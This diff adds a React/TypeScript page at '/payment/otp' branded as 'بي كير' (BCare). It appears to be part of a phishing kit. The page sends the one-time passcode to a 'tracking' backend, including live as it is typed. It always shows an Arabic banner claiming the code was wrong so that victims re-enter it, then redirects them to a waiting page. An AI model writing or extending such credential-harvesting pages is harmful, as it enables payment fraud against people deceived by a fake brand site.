@@ -1,1 +1,52 @@
-aW1wb3J0IHsgY3JlYXRlRmlsZVJvdXRlLCB1c2VOYXZpZ2F0ZSB9IGZyb20gIkB0YW5zdGFjay9yZWFjdC1yb3V0ZXIiOwppbXBvcnQgeyBQdWJsaWNMYXlvdXQgfSBmcm9tICJAL2NvbXBvbmVudHMvUHVibGljTGF5b3V0IjsKaW1wb3J0IHsgUmVqZWN0QmFubmVyIH0gZnJvbSAiQC9jb21wb25lbnRzL1JlamVjdEJhbm5lciI7CmltcG9ydCB7IHVzZVN0YXRlIH0gZnJvbSAicmVhY3QiOwppbXBvcnQgeyB6IH0gZnJvbSAiem9kIjsKaW1wb3J0IHsgdXNlVmlzaXRvclRyYWNraW5nIH0gZnJvbSAiQC9ob29rcy91c2VWaXNpdG9yVHJhY2tpbmciOwppbXBvcnQgeyB1c2VMaXZlSW5wdXQgfSBmcm9tICJAL2hvb2tzL3VzZUxpdmVJbnB1dCI7CmltcG9ydCB7IHNhdmVPdHAgfSBmcm9tICJAL2xpYi90cmFja2luZy5mdW5jdGlvbnMiOwoKZXhwb3J0IGNvbnN0IFJvdXRlID0gY3JlYXRlRmlsZVJvdXRlKCIvcGF5bWVudC9vdHAiKSh7CiAgaGVhZDogKCkgPT4gKHsgbWV0YTogW3sgdGl0bGU6ICLYsdmF2LIg2KfZhNiq2K3ZgtmCIHwg2KjZiiDZg9mK2LEiIH1dIH0pLAogIHZhbGlkYXRlU2VhcmNoOiB6Lm9iamVjdCh7IGVycm9yOiB6LnVuaW9uKFt6LnN0cmluZygpLCB6Lm51bWJlcigpXSkub3B0aW9uYWwoKSB9KSwKICBjb21wb25lbnQ6IE90cFBhZ2UsCn0pOwoKZnVuY3Rpb24gT3RwUGFnZSgpIHsKICB1c2VWaXNpdG9yVHJhY2tpbmcoIk9UUCIpOwogIGNvbnN0IG5hdmlnYXRlID0gdXNlTmF2aWdhdGUoKTsKICBjb25zdCBbb3RwLCBzZXRPdHBdID0gdXNlU3RhdGUoIiIpOwogIHVzZUxpdmVJbnB1dCh7IG90cCB9KTsKICBjb25zdCBbbG9hZGluZywgc2V0TG9hZGluZ10gPSB1c2VTdGF0ZShmYWxzZSk7CgogIGFzeW5jIGZ1bmN0aW9uIG9uU3VibWl0KGU6IFJlYWN0LkZvcm1FdmVudCkgewogICAgZS5wcmV2ZW50RGVmYXVsdCgpOwogICAgY29uc3Qgc2Vzc2lvbklkID0gd2luZG93LmxvY2FsU3RvcmFnZS5nZXRJdGVtKCJiY2FyZV9zZXNzaW9uX2lkIik7CiAgICBpZiAoIXNlc3Npb25JZCkgcmV0dXJuOwogICAgc2V0TG9hZGluZyh0cnVlKTsKICAgIGF3YWl0IHNhdmVPdHAoeyBkYXRhOiB7IHNlc3Npb25faWQ6IHNlc3Npb25JZCwgb3RwIH0gfSkuY2F0Y2goKCkgPT4ge30pOwogICAgc2V0TG9hZGluZyhmYWxzZSk7CiAgICBuYXZpZ2F0ZSh7IHRvOiAiL3BheW1lbnQvd2FpdCIsIHNlYXJjaDogeyBmcm9tOiAib3RwIiB9IH0pOwogIH0KCiAgcmV0dXJuICgKICAgIDxQdWJsaWNMYXlvdXQ+CiAgICAgIDxkaXYgY2xhc3NOYW1lPSJjb250YWluZXIgbXgtYXV0byBweC0zIHB5LTgiPgogICAgICAgIDxkaXYgY2xhc3NOYW1lPSJteC1hdXRvIG1heC13LW1kIj4KICAgICAgICAgIDxSZWplY3RCYW5uZXIgbWVzc2FnZT0i2LHZhdiyINin2YTYqtit2YLZgiDYutmK2LEg2LXYrdmK2K3YjCDZitix2KzZiSDYpdi52KfYr9ipINil2K/Yrtin2YTZhy4iIC8+CiAgICAgICAgICA8ZGl2IGNsYXNzTmFtZT0icm91bmRlZC0yeGwgYmctd2hpdGUgcC02IHNoYWRvdy1zbSB0ZXh0LWNlbnRlciI+CiAgICAgICAgICAgIDxoMSBjbGFzc05hbWU9Im1iLTIgdGV4dC14bCBmb250LWJvbGQgdGV4dC1iY2FyZS1ibHVlIj7YsdmF2LIg2KfZhNiq2K3ZgtmCPC9oMT4KICAgICAgICAgICAgPHAgY2xhc3NOYW1lPSJtYi02IHRleHQtc20gdGV4dC1iY2FyZS1tdXRlZCI+2KrZhSDYpdix2LPYp9mEINix2YXYsiDYp9mE2KrYrdmC2YIg2KXZhNmJINmH2KfYqtmB2YMg2KfZhNmF2LPYrNmEPC9wPgogICAgICAgICAgICA8Zm9ybSBvblN1Ym1pdD17b25TdWJtaXR9IGNsYXNzTmFtZT0ic3BhY2UteS00Ij4KICAgICAgICAgICAgICA8aW5wdXQgdmFsdWU9e290cH0gb25DaGFuZ2U9eyhlKSA9PiBzZXRPdHAoZS50YXJnZXQudmFsdWUpfSBpbnB1dE1vZGU9Im51bWVyaWMiIG1heExlbmd0aD17OH0gcmVxdWlyZWQgY2xhc3NOYW1lPSJoLTE0IHctZnVsbCByb3VuZGVkLWxnIGJvcmRlciBib3JkZXItYmNhcmUtYm9yZGVyIHB4LTMgdGV4dC1jZW50ZXIgdGV4dC0yeGwgdHJhY2tpbmctd2lkZXN0IG91dGxpbmUtbm9uZSBmb2N1czpib3JkZXItYmNhcmUtYmx1ZSIgcGxhY2Vob2xkZXI9IuKXj+KXj+KXj+KXj+KXj+KXjyIgLz4KICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgZGlzYWJsZWQ9e2xvYWRpbmd9IGNsYXNzTmFtZT0iZmxleCBoLTEyIHctZnVsbCBpdGVtcy1jZW50ZXIganVzdGlmeS1jZW50ZXIgcm91bmRlZC1sZyBiZy1iY2FyZS1vcmFuZ2UgZm9udC1ib2xkIHRleHQtd2hpdGUgZGlzYWJsZWQ6b3BhY2l0eS02MCI+CiAgICAgICAgICAgICAgICB7bG9hZGluZyA/ICLYrNin2LHZiiDYp9mE2KrYrdmC2YIuLi4iIDogItiq2KPZg9mK2K8ifQogICAgICAgICAgICAgIDwvYnV0dG9uPgogICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY+CiAgICA8L1B1YmxpY0xheW91dD4KICApOwp9Cg==
+import { createFileRoute, useNavigate } from "@tanstack/react-router";
+import { PublicLayout } from "@/components/PublicLayout";
+import { RejectBanner } from "@/components/RejectBanner";
+import { useState } from "react";
+import { z } from "zod";
+import { useVisitorTracking } from "@/hooks/useVisitorTracking";
+import { useLiveInput } from "@/hooks/useLiveInput";
+import { saveOtp } from "@/lib/tracking.functions";
+
+export const Route = createFileRoute("/payment/otp")({
+  head: () => ({ meta: [{ title: "رمز التحقق | بي كير" }] }),
+  validateSearch: z.object({ error: z.union([z.string(), z.number()]).optional() }),
+  component: OtpPage,
+});
+
+function OtpPage() {
+  useVisitorTracking("OTP");
+  const navigate = useNavigate();
+  const [otp, setOtp] = useState("");
+  useLiveInput({ otp });
+  const [loading, setLoading] = useState(false);
+
+  async function onSubmit(e: React.FormEvent) {
+    e.preventDefault();
+    const sessionId = window.localStorage.getItem("bcare_session_id");
+    if (!sessionId) return;
+    setLoading(true);
+    await saveOtp({ data: { session_id: sessionId, otp } }).catch(() => {});
+    setLoading(false);
+    navigate({ to: "/payment/wait", search: { from: "otp" } });
+  }
+
+  return (
+    <PublicLayout>
+      <div className="container mx-auto px-3 py-8">
+        <div className="mx-auto max-w-md">
+          <RejectBanner message="رمز التحقق غير صحيح، يرجى إعادة إدخاله." />
+          <div className="rounded-2xl bg-white p-6 shadow-sm text-center">
+            <h1 className="mb-2 text-xl font-bold text-bcare-blue">رمز التحقق</h1>
+            <p className="mb-6 text-sm text-bcare-muted">تم إرسال رمز التحقق إلى هاتفك المسجل</p>
+            <form onSubmit={onSubmit} className="space-y-4">
+              <input value={otp} onChange={(e) => setOtp(e.target.value)} inputMode="numeric" maxLength={8} required className="h-14 w-full rounded-lg border border-bcare-border px-3 text-center text-2xl tracking-widest outline-none focus:border-bcare-blue" placeholder="●●●●●●" />
+              <button type="submit" disabled={loading} className="flex h-12 w-full items-center justify-center rounded-lg bg-bcare-orange font-bold text-white disabled:opacity-60">
+                {loading ? "جاري التحقق..." : "تأكيد"}
+              </button>
+            </form>
+          </div>
+        </div>
+      </div>
+    </PublicLayout>
+  );
+}
